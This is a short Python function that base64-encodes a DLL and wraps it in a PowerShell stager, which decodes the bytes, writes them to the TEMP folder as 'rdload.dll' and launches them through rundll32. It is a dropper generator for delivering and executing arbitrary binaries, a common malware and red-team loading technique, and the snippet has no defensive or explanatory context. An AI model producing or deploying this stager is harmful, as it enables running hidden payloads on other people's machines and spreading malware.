import base64

def generate_ps_from_dll(path):
    with open(path, 'rb') as f:
        encoded = base64.b64encode(f.read()).decode()
    return f"""$data = '{encoded}'
$bytes = [System.Convert]::FromBase64String($data)
$path = "$env:TEMP\\rdload.dll"
[IO.File]::WriteAllBytes($path, $bytes)
Start-Process 'rundll32.exe' -ArgumentList "$path,EntryPoint"
"""
